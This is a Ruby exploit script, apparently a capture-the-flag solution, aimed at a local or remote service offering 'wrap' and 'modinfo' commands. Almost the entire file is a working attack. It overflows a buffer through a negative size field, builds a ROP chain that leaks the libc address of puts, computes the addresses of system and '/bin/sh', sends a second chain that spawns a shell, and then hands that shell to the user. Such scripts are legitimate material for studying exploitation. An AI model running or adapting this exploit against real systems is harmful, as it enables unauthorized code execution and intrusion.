#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'expect'
require 'socket'
require 'pty'
require 'io/console'
require 'colorize'


def log data
    $stdout.puts data.inspect.black.on_white
end

def logerror e
    $stdout.puts e.inspect.black.on_red
end


module IOExtension
    def interact
        begin
            until self.closed? do
                readable, _, _, _ = IO.select([self, $stdin])
                readable.each do |source|
                    case source
                    when self
                        input = self.readchar
                        $stdout.print input.cyan
                    when $stdin
                        self.print $stdin.gets
                    else
                        raise StandardError
                    end
                end
            end
        rescue EOFError => e
            logerror e
            self.close
            return
        rescue Interrupt
            return
        end
    end
end

class IO
    prepend IOExtension
end


target = :local
if ARGV[0] == 'remote' then target = :remote end

case target
when :local
    $s, slave = PTY.open
    PTY.spawn(ARGV[0], :in=>slave, :out=>slave)
    $s.echo = false
when :remote
    host = ARGV[1]
    port = ARGV[2]
    $s = TCPSocket.new host, port
end

def wrap size, gift
    puts "wrap"
    $s.write "wrap\n"
    print $s.expect("> ")[0].cyan

    puts size.to_s
    $s.write(size.to_s + "\n")
    print $s.expect("> ")[0].cyan

    puts gift
    $s.write(gift + "\n");
end

def wrap2 size, gift
    puts size.to_s
    $s.write(size.to_s + "\n")
    print $s.expect("> ")[0].cyan

    puts gift
    $s.write(gift + "\n");
end


def modinfo
    puts "modinfo"
    $s.write "modinfo\n"
    answer = $s.expect("> ")[0]
    base = answer[/0x.[[:xdigit:]]*/, 0].chomp
    log "Module base: #{base}"
    print answer.cyan
    return base.to_i 16
end


def Q address
    [address].pack("Q")
end



LIBC_OFFSET_SYSTEM = 0x47dc0
LIBC_OFFSET_PUTS = 0x78460

POP_RDI = 0x000000000040154a

GOT_PUTS = 0x602018
PUTS = 0x400be0



print $s.expect("> ")[0].cyan
base = modinfo
wrap = base + 0x80a


# leak libc
wrap(-5, "A" * 0x88 + Q(POP_RDI) + Q(GOT_PUTS) + Q(PUTS) + Q(wrap))
print $s.expect("beautiful\n")[0].cyan

libc_puts = $s.expect("\n")[0].chomp.ljust(8, "\x00").unpack("Q")[0]
libc = libc_puts - LIBC_OFFSET_PUTS
log "System: 0x#{libc.to_s 16}"

print $s.expect("> ")[0].cyan


# call system
libc_system = libc + LIBC_OFFSET_SYSTEM
binsh = libc + 0x1a3ee0
wrap2(-5, "A" * 0x88 + Q(POP_RDI) + Q(binsh) + Q(libc_system))


$s.interact
